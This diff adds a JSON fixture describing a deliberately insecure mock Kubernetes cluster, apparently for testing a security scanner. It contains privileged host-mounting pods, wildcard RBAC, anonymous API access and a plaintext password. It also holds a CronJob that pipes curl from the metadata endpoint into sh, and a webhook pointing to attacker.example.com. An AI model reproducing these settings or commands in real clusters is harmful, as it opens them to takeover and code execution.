@@ -1,0 +1,211 @@
+{
+  "_comment": "Deliberately insecure mock cluster (camelCase, matches live K8s API JSON) used for --mock scans and tests. Trips a wide spread of rules across all 10 shards.",
+
+  "namespaces": [
+    {"kind": "Namespace", "metadata": {"name": "production", "labels": {}}},
+    {"kind": "Namespace", "metadata": {"name": "staging", "labels": {"pod-security.kubernetes.io/enforce": "privileged"}}},
+    {"kind": "Namespace", "metadata": {"name": "monitoring", "labels": {"pod-security.kubernetes.io/enforce": "restricted"}}},
+    {"kind": "Namespace", "metadata": {"name": "kube-system", "labels": {}}}
+  ],
+
+  "pods": [
+    {
+      "kind": "Pod",
+      "metadata": {"name": "payment-api", "namespace": "production"},
+      "spec": {
+        "serviceAccountName": "shared-sa",
+        "hostPID": true,
+        "hostNetwork": true,
+        "hostIPC": true,
+        "volumes": [
+          {"name": "dockersock", "hostPath": {"path": "/var/run/docker.sock"}},
+          {"name": "hostroot", "hostPath": {"path": "/"}}
+        ],
+        "containers": [
+          {
+            "name": "app",
+            "image": "nginx:latest",
+            "imagePullPolicy": "IfNotPresent",
+            "securityContext": {
+              "privileged": true,
+              "runAsUser": 0,
+              "allowPrivilegeEscalation": true,
+              "capabilities": {"add": ["SYS_ADMIN", "NET_RAW"]}
+            },
+            "env": [
+              {"name": "DB_PASSWORD", "valueFrom": {"secretKeyRef": {"name": "db", "key": "password"}}}
+            ],
+            "volumeMounts": [{"name": "hostroot", "mountPath": "/host"}]
+          }
+        ]
+      }
+    },
+    {
+      "kind": "Pod",
+      "metadata": {"name": "user-service", "namespace": "production"},
+      "spec": {
+        "serviceAccountName": "shared-sa",
+        "automountServiceAccountToken": false,
+        "securityContext": {"runAsNonRoot": true, "seccompProfile": {"type": "RuntimeDefault"}},
+        "containers": [
+          {
+            "name": "svc",
+            "image": "myco/user-service@sha256:abc123",
+            "securityContext": {
+              "runAsNonRoot": true,
+              "allowPrivilegeEscalation": false,
+              "readOnlyRootFilesystem": true,
+              "capabilities": {"drop": ["ALL"]}
+            },
+            "resources": {"limits": {"cpu": "500m", "memory": "256Mi"}}
+          }
+        ]
+      }
+    },
+    {
+      "kind": "Pod",
+      "metadata": {"name": "cache-redis", "namespace": "staging"},
+      "spec": {
+        "serviceAccountName": "shared-sa",
+        "containers": [
+          {
+            "name": "redis",
+            "image": "redis:latest",
+            "volumeMounts": [{"name": "creds", "mountPath": "/root/.aws/credentials"}]
+          }
+        ]
+      }
+    },
+    {
+      "kind": "Pod",
+      "metadata": {"name": "nignx-web", "namespace": "production"},
+      "spec": {
+        "containers": [
+          {"name": "web", "image": "nignx:latest",
+           "resources": {"limits": {"cpu": "100m", "memory": "128Mi"}},
+           "securityContext": {"runAsNonRoot": true, "allowPrivilegeEscalation": false,
+                               "readOnlyRootFilesystem": true, "seccompProfile": {"type": "RuntimeDefault"},
+                               "capabilities": {"drop": ["ALL"]}}}
+        ]
+      }
+    }
+  ],
+
+  "deployments": [],
+
+  "cronjobs": [
+    {
+      "kind": "CronJob",
+      "metadata": {"name": "backup-cron", "namespace": "production"},
+      "spec": {
+        "schedule": "* * * * *",
+        "jobTemplate": {"spec": {"template": {"spec": {"containers": [
+          {"name": "runner", "image": "curlimages/curl:latest",
+           "command": ["sh", "-c", "curl http://169.254.169.254 | sh"]}
+        ]}}}}
+      }
+    }
+  ],
+
+  "services": [
+    {"kind": "Service", "metadata": {"name": "api-nodeport", "namespace": "production"},
+     "spec": {"type": "NodePort", "ports": [{"port": 80, "nodePort": 31000}]}},
+    {"kind": "Service", "metadata": {"name": "lb-public", "namespace": "production"},
+     "spec": {"type": "LoadBalancer", "ports": [{"port": 443}]}},
+    {"kind": "Service", "metadata": {"name": "kubernetes-dashboard", "namespace": "kubernetes-dashboard"},
+     "spec": {"type": "NodePort", "ports": [{"port": 443, "nodePort": 30443}]}}
+  ],
+
+  "ingresses": [
+    {"kind": "Ingress", "metadata": {"name": "web-ingress", "namespace": "production"},
+     "spec": {"rules": [{"host": "app.example.com"}]}}
+  ],
+
+  "networkpolicies": [
+    {"kind": "NetworkPolicy", "metadata": {"name": "allow-metrics", "namespace": "monitoring"},
+     "spec": {"podSelector": {}, "policyTypes": ["Ingress", "Egress"]}}
+  ],
+
+  "serviceaccounts": [
+    {"kind": "ServiceAccount", "metadata": {"name": "shared-sa", "namespace": "production",
+     "annotations": {"eks.amazonaws.com/role-arn": "arn:aws:iam::111:role/shared"}}},
+    {"kind": "ServiceAccount", "metadata": {"name": "default", "namespace": "kube-system"}}
+  ],
+
+  "secrets": [
+    {"kind": "Secret", "metadata": {"name": "db", "namespace": "production"}, "type": "Opaque"}
+  ],
+
+  "configmaps": [
+    {"kind": "ConfigMap", "metadata": {"name": "app-config", "namespace": "production"},
+     "data": {"log_level": "info", "admin_password": "hunter2"}}
+  ],
+
+  "clusterroles": [
+    {"kind": "ClusterRole", "metadata": {"name": "super-role"},
+     "rules": [{"apiGroups": ["*"], "resources": ["*"], "verbs": ["*"]}]},
+    {"kind": "ClusterRole", "metadata": {"name": "secret-reader"},
+     "rules": [{"apiGroups": [""], "resources": ["secrets"], "verbs": ["get", "list"]}]},
+    {"kind": "ClusterRole", "metadata": {"name": "binder"},
+     "rules": [{"apiGroups": ["rbac.authorization.k8s.io"], "resources": ["clusterroles"], "verbs": ["bind", "escalate"]}]},
+    {"kind": "ClusterRole", "metadata": {"name": "cm-writer"},
+     "rules": [{"apiGroups": [""], "resources": ["configmaps", "events"], "verbs": ["update", "patch", "delete"]}]}
+  ],
+
+  "roles": [],
+
+  "clusterrolebindings": [
+    {"kind": "ClusterRoleBinding", "metadata": {"name": "default-admin"},
+     "roleRef": {"kind": "ClusterRole", "name": "cluster-admin"},
+     "subjects": [{"kind": "ServiceAccount", "name": "default", "namespace": "kube-system"}]}
+  ],
+
+  "rolebindings": [],
+
+  "mutatingwebhookconfigurations": [
+    {"kind": "MutatingWebhookConfiguration", "metadata": {"name": "evil-webhook"},
+     "webhooks": [{"name": "inject.evil.io", "failurePolicy": "Ignore",
+       "clientConfig": {"url": "https://attacker.example.com/mutate"},
+       "namespaceSelector": {}}]}
+  ],
+
+  "validatingwebhookconfigurations": [],
+
+  "componentconfig": [
+    {"kind": "ComponentConfig", "metadata": {"name": "control-plane"},
+     "spec": {
+       "version": "v1.24.0",
+       "apiServer": {"anonymousAuth": true, "insecurePort": 0, "auditLogPath": "",
+                     "encryptionProvider": "",
+                     "flags": {
+                       "anonymous-auth": "true", "profiling": "true",
+                       "authorization-mode": "AlwaysAllow", "token-auth-file": "/etc/k8s/tokens",
+                       "enable-admission-plugins": "NamespaceLifecycle,ServiceAccount",
+                       "audit-log-path": "", "service-account-lookup": "true",
+                       "client-ca-file": "/etc/kubernetes/pki/ca.crt",
+                       "tls-cert-file": "/etc/kubernetes/pki/apiserver.crt"
+                     }},
+       "controllerManager": {"flags": {
+                       "profiling": "true", "bind-address": "0.0.0.0",
+                       "use-service-account-credentials": "true",
+                       "root-ca-file": "/etc/kubernetes/pki/ca.crt"
+                     }},
+       "scheduler": {"flags": {"profiling": "true", "bind-address": "127.0.0.1"}},
+       "etcd": {"clientCertAuth": false, "flags": {
+                       "cert-file": "/etc/etcd/cert.pem", "auto-tls": "true",
+                       "peer-auto-tls": "true", "peer-client-cert-auth": "false"
+                     }},
+       "kubelet": {"anonymousAuth": true, "readOnlyPort": 10255, "authorizationMode": "AlwaysAllow",
+                   "flags": {
+                       "streaming-connection-idle-timeout": "0",
+                       "make-iptables-util-chains": "true", "rotate-certificates": "false"
+                     }}
+     }}
+  ],
+
+  "cloudiam": [
+    {"kind": "WorkloadIdentity", "serviceAccount": "shared-sa", "namespace": "production",
+     "role": "arn:aws:iam::111:role/shared", "actions": ["s3:*"]},
+    {"kind": "NodeInstanceRole", "role": "eks-node-role", "actions": ["AdministratorAccess"]}
+  ]
+}
